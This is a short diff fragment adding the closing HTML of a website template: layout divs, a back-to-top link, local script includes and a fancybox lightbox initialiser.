+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
